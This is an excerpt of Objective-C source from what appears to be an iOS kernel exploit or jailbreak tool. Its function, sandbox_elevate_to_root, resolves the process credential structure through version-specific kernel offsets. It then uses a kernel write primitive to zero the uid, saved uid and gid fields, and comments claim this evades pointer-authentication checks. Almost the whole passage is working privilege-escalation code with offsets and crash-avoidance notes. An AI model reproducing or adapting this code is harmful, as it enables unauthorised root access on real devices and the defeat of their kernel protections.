...
#pragma mark - UID elevation (uid=0 via posix_cred in-place patch)

// Resolve ucred via the VERIFIED offset off_proc_ro_p_ucred (0x20 on iOS 17.x,
// 0x28 on 18.4+ — from offsets.m, author-verified on iPhone13,1/17.6.1).
// NO heuristic scanning — scanning could match a freed cred object
// and cause zone-cred use-after-free panic on iOS 17.5.1!
static uint64_t sbx_ucredbyproc(uint64_t proc) {
    ...
    uint64_t ucred = 0;
    if (off_proc_ro_p_ucred == 0x20) {
        ucred = kread_smrptr(proc_ro + off_proc_ro_p_ucred);
        if (!K(ucred)) ucred = S(early_kread64(proc_ro + off_proc_ro_p_ucred));
    } else {
        ucred = S(early_kread64(proc_ro + off_proc_ro_p_ucred));
        if (!K(ucred)) ucred = kread_smrptr(proc_ro + off_proc_ro_p_ucred);
    }
    return K(ucred) ? ucred : 0;
}
...
int sandbox_elevate_to_root(uint64_t self_proc) {
    ...
    if (!K(ourucred)) {
        NSLog(@"[SBX] elevate: failed to resolve our ucred");
        return -1;
    }
    NSLog(@"[SBX] elevate: our ucred: 0x%llx", ourucred);

    // Validate: cr_label at +0x78 must point to a live kernel addr
    uint64_t lbl = S(early_kread64(ourucred + OFF_UCRED_CR_LABEL));
    if (!K(lbl)) {
        NSLog(@"[SBX] elevate: ucred cr_label invalid — wrong slot");
        return -1;
    }

    // Patch posix_cred (uid=0, ruid=0, svuid=0, gid=0) in-place!
    // This NEVER touches proc.ucred pointer -> 100% immune to PAC DA key checks (Break 0xC472)!
    uint64_t posix_cred = ourucred + OFF_UCRED_CR_POSIX; // +0x18
    early_kwrite64(posix_cred + OFF_POSIX_CR_UID,   0); // uid=0, ruid=0
    early_kwrite64(posix_cred + OFF_POSIX_CR_SVUID, 0); // svuid=0, ngroups=0
    early_kwrite64(posix_cred + OFF_POSIX_CR_RGID,  0); // rgid=0, svgid=0

    NSLog(@"[SBX] elevate in-place posix_cred done, current uid: %d", getuid());
    return 0;
}
